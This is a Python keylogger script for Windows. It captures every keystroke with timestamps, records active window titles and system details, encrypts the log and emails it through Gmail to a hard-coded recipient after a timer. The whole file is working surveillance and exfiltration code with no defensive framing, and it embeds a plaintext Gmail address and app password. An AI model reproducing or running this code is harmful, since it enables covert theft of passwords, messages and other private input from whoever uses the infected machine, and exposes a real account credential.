import keyboard
import datetime
import platform
from cryptography.fernet import Fernet
import win32gui
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import threading

# Generating a key for Symmetric Encryption, Fernet is a symmetric encryption algorithm
key = Fernet.generate_key()
cipher = Fernet(key)

keylog_file = 'keystrokes.txt'
email_address = 'shankhosuvrog@gmail.com'
email_password = 'zczwkujuxgwjuosc'
recipient_email = 'shankhosuvro.ghosh@gmail.com'

keystrokes_buffer = []
session_duration = 10  # Duration of the session in seconds

def get_active_window_title():
    window = win32gui.GetForegroundWindow()
    title = win32gui.GetWindowText(window)
    return title

def log_window_info():
    active_window_title = get_active_window_title()
    with open(keylog_file, 'a', encoding='utf-8') as file:
        file.write("Active Window:\n")
        file.write(f"Title: {active_window_title}\n")
        file.write("\n")

def systeminfo():
    system_info = platform.uname()
    with open(keylog_file, 'a', encoding='utf-8') as file:
        file.write("System Information:\n")
        file.write(f"System: {system_info.system}\n")
        file.write(f"Node Name: {system_info.node}\n")
        file.write(f"Release: {system_info.release}\n")
        file.write(f"Version: {system_info.version}\n")
        file.write(f"Machine: {system_info.machine}\n")
        file.write(f"Processor: {system_info.processor}\n")
        file.write("\n")

def send_email(subject, message, to_email):
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email_address, email_password)

        msg = MIMEMultipart()
        msg['From'] = email_address
        msg['To'] = to_email
        msg['Subject'] = subject

        msg.attach(MIMEText(message, 'plain'))

        server.send_message(msg)
        server.quit()
        print("Email sent successfully")
    except Exception as e:
        print("Error sending email:", str(e))

def send_email_after_session():
    global keystrokes_buffer

    # Encrypt the keystrokes
    keystrokes = '\n'.join(keystrokes_buffer).encode('utf-8')
    encrypted_keystrokes = cipher.encrypt(keystrokes)

    # Read system information
    with open(keylog_file, 'r', encoding='utf-8') as file:
        system_info = file.read()

    # Encrypt system information
    encrypted_system_info = cipher.encrypt(system_info.encode('utf-8'))

    # Send the encrypted log file via email
    subject = 'Keystroke Log'
    message = 'Please find attached the encrypted keystroke log and system information.\n\n'
    message += "Encrypted Keystrokes:\n" + encrypted_keystrokes.decode('utf-8') + "\n\n"
    message += "Encrypted System Information:\n" + encrypted_system_info.decode('utf-8')
    send_email(subject, message, recipient_email)

def on_press(event):
    global keystrokes_buffer

    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    keystrokes_buffer.append(f"[{timestamp}] {event.name}")

    log_window_info()

def start_session_timer():
    global session_duration
    threading.Timer(session_duration, send_email_after_session).start()

keyboard.on_press(on_press)
systeminfo()

# Start monitoring keystrokes and window focus
start_session_timer()
keyboard.wait()
